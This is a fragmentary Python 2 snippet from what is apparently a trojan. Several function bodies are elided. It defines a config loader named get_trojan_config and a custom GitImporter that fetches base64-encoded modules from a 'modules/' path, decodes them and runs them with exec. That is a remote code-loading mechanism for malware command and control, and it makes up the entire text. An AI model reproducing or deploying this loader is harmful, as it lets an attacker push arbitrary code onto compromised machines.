...
def get_filie_contents(filepath):
...
def get_trojan_config():
	global configured
	config_json = get_filie_contents(trojan_config)
...
class GitImporter(object):
	def __init__(self):
		self.currrent_module_code = ''

	def find_module(self, fullname, path=None):
		if configured:
			print "[*] Attempting to retrieve %s" % fullname
			new_library = get_filie_contents("modules/%s" % fullname)

			if new_library is not None:
				self.currrent_module_code = base64.b64decode(new_library)
				return self
		return None

	def load_module(self, name):
		module = imp.new_module(name)
		exec self.currrent_module_code in module.__dict__
